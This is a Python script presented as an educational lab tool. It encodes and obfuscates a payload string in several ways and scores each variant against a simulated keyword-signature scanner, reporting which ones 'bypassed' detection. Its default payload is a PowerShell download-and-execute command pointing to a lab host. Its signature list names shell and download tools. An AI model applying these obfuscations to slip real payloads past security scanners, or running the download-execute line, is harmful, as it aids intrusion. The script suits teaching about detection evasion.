#!/usr/bin/env python3
"""
=============================================================
  Custom Payload Encoder & Obfuscation Framework
  Educational Security Research Tool
  For: Internship / Lab Environment Only
=============================================================
"""

import base64
import random
import json
import argparse
from datetime import datetime


# =============================================================
# MODULE 1: ENCODING
# =============================================================

class EncoderModule:
    """Handles Base64, XOR, and ROT13 encoding and decoding."""

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode("utf-8")).decode("utf-8")

    @staticmethod
    def base64_decode(encoded: str) -> str:
        return base64.b64decode(encoded.encode("utf-8")).decode("utf-8")

    @staticmethod
    def xor_encode(payload: str, key: int = 42) -> str:
        """XOR each byte with the key; wrap in Base64 for printable output."""
        xored = bytes([b ^ key for b in payload.encode("utf-8")])
        return base64.b64encode(xored).decode("utf-8")

    @staticmethod
    def xor_decode(encoded: str, key: int = 42) -> str:
        raw = base64.b64decode(encoded.encode("utf-8"))
        return bytes([b ^ key for b in raw]).decode("utf-8")

    @staticmethod
    def rot13_encode(payload: str) -> str:
        result = []
        for ch in payload:
            if "a" <= ch <= "z":
                result.append(chr((ord(ch) - ord("a") + 13) % 26 + ord("a")))
            elif "A" <= ch <= "Z":
                result.append(chr((ord(ch) - ord("A") + 13) % 26 + ord("A")))
            else:
                result.append(ch)
        return "".join(result)

    # ROT13 is its own inverse
    rot13_decode = rot13_encode

    @staticmethod
    def layered_encode(payload: str, key: int = 42) -> str:
        """Three-layer encoding: XOR → Base64 → ROT13."""
        step1 = EncoderModule.xor_encode(payload, key)
        step2 = EncoderModule.base64_encode(step1)
        step3 = EncoderModule.rot13_encode(step2)
        return step3

    @staticmethod
    def layered_decode(encoded: str, key: int = 42) -> str:
        step1 = EncoderModule.rot13_decode(encoded)
        step2 = EncoderModule.base64_decode(step1)
        step3 = EncoderModule.xor_decode(step2, key)
        return step3


# =============================================================
# MODULE 2: STRING OBFUSCATION
# =============================================================

class ObfuscationModule:
    """Applies various string-level obfuscation transforms."""

    @staticmethod
    def random_char_insert(payload: str, char: str = "_", every: int = 5) -> str:
        """Insert a marker character every N positions."""
        parts = [payload[i:i + every] for i in range(0, len(payload), every)]
        return char.join(parts)

    @staticmethod
    def split_concat(payload: str, chunk: int = 4) -> str:
        """Represent payload as a string concatenation expression."""
        chunks = [payload[i:i + chunk] for i in range(0, len(payload), chunk)]
        return " + ".join(f'"{c}"' for c in chunks)

    @staticmethod
    def reverse(payload: str) -> str:
        return payload[::-1]

    @staticmethod
    def hex_escape(payload: str) -> str:
        """Convert every character to its \\xNN hex-escape form."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def case_scramble(payload: str) -> str:
        """Randomly alternate upper/lower case (non-deterministic)."""
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower() for c in payload
        )

    @staticmethod
    def unicode_escape(payload: str) -> str:
        """Convert every character to its \\uNNNN Unicode escape form."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)


# =============================================================
# MODULE 3: SIMULATED DETECTION
# =============================================================

class DetectionModule:
    """
    Simulates a simple signature-based detection engine.
    Uses a static list of keyword signatures (no real AV/EDR involved).
    """

    SIGNATURES = [
        # Shell / command references used as test markers
        "cmd.exe", "powershell", "wget", "curl", "/bin/bash",
        "eval(", "exec(", "os.system", "subprocess",
        "invoke-expression", "iex ", "shell_exec",
        "base64_decode", "fromcharcode", "mshta", "wscript",
    ]

    @classmethod
    def scan(cls, payload: str) -> dict:
        lower = payload.lower()
        hits = [sig for sig in cls.SIGNATURES if sig.lower() in lower]
        return {
            "detected": bool(hits),
            "matched_signatures": hits,
            "match_count": len(hits),
        }


# =============================================================
# MODULE 4: REPORTING ENGINE
# =============================================================

class ReportingEngine:
    """Assembles encoding, obfuscation, and detection data into a report."""

    def __init__(self, payload: str, xor_key: int = 42):
        self.payload = payload
        self.xor_key = xor_key
        self.enc = EncoderModule()
        self.obf = ObfuscationModule()
        self.det = DetectionModule()

    def build(self) -> dict:
        p = self.payload
        k = self.xor_key

        encodings = {
            "base64":  self.enc.base64_encode(p),
            "xor":     self.enc.xor_encode(p, k),
            "rot13":   self.enc.rot13_encode(p),
            "layered": self.enc.layered_encode(p, k),
        }

        obfuscations = {
            "random_insert":  self.obf.random_char_insert(p),
            "split_concat":   self.obf.split_concat(p),
            "reversed":       self.obf.reverse(p),
            "hex_escape":     self.obf.hex_escape(p),
            "case_scramble":  self.obf.case_scramble(p),
            "unicode_escape": self.obf.unicode_escape(p),
        }

        all_variants = {"original": p, **encodings, **obfuscations}
        detection = {name: self.det.scan(val) for name, val in all_variants.items()}

        evasion_summary = {
            name: (
                "BYPASSED ✓"
                if not res["detected"]
                else f"DETECTED ✗  [{res['match_count']} sig(s): {', '.join(res['matched_signatures'])}]"
            )
            for name, res in detection.items()
        }

        return {
            "timestamp": datetime.now().isoformat(),
            "original_payload": p,
            "xor_key": k,
            "encodings": encodings,
            "obfuscations": obfuscations,
            "detection_results": detection,
            "evasion_summary": evasion_summary,
        }

    @staticmethod
    def print_report(report: dict) -> None:
        W = 65
        print("\n" + "=" * W)
        print("  PAYLOAD ENCODER & OBFUSCATION FRAMEWORK — REPORT")
        print("=" * W)
        print(f"  Timestamp : {report['timestamp']}")
        print(f"  XOR Key   : {report['xor_key']}")
        print(f"  Original  : {report['original_payload'][:70]}")

        # --- Encodings ---
        print("\n" + "-" * W)
        print("  ENCODINGS")
        print("-" * W)
        for name, val in report["encodings"].items():
            display = val[:60] + "…" if len(val) > 60 else val
            print(f"  [{name.upper():>8}]  {display}")

        # --- Obfuscations ---
        print("\n" + "-" * W)
        print("  STRING OBFUSCATIONS")
        print("-" * W)
        for name, val in report["obfuscations"].items():
            display = val[:60] + "…" if len(val) > 60 else val
            print(f"  [{name.upper():>14}]  {display}")

        # --- Detection Results ---
        print("\n" + "-" * W)
        print("  EVASION TEST RESULTS  (simulated signature engine)")
        print("-" * W)
        print(f"  {'Variant':<18}  {'Result'}")
        print("  " + "-" * 55)
        for variant, result in report["evasion_summary"].items():
            print(f"  {variant:<18}  {result}")

        # --- Statistics ---
        total = len(report["evasion_summary"])
        bypassed = sum(
            1 for v in report["evasion_summary"].values() if v.startswith("BYPASSED")
        )
        print("\n" + "-" * W)
        print(f"  Bypass rate: {bypassed}/{total} variants evaded detection")
        print("=" * W + "\n")


# =============================================================
# DECODE VERIFICATION HELPER
# =============================================================

def verify_decoding(report: dict) -> None:
    key = report["xor_key"]
    enc = EncoderModule()
    print("\n--- DECODE VERIFICATION ---")
    try:
        print(f"  Base64 → {enc.base64_decode(report['encodings']['base64'])}")
        print(f"  XOR    → {enc.xor_decode(report['encodings']['xor'], key)}")
        print(f"  ROT13  → {enc.rot13_decode(report['encodings']['rot13'])}")
        print(f"  Layered→ {enc.layered_decode(report['encodings']['layered'], key)}")
    except Exception as ex:
        print(f"  Decode error: {ex}")


# =============================================================
# CLI ENTRY POINT
# =============================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Payload Encoder & Obfuscation Framework (Educational)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload_framework.py
  python payload_framework.py -p "cmd.exe /c whoami" -k 77
  python payload_framework.py -p "eval(os.system('id'))" -o report.json --verify
        """,
    )
    p.add_argument("--payload", "-p", type=str,
                   help="Payload string to encode/obfuscate")
    p.add_argument("--xor-key", "-k", type=int, default=42,
                   help="XOR key 0-255 (default: 42)")
    p.add_argument("--output", "-o", type=str,
                   help="Save JSON report to this file")
    p.add_argument("--verify", "-v", action="store_true",
                   help="Show decode verification after report")
    return p


def main():
    args = build_parser().parse_args()

    # Default demonstration payload if none supplied
    payload = args.payload or (
        'powershell -c "Invoke-Expression(wget http://lab.internal/test.ps1)"'
    )

    engine = ReportingEngine(payload=payload, xor_key=args.xor_key)
    report = engine.build()
    ReportingEngine.print_report(report)

    if args.verify:
        verify_decoding(report)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=2, ensure_ascii=False)
        print(f"[+] JSON report saved → {args.output}\n")


if __name__ == "__main__":
    main()
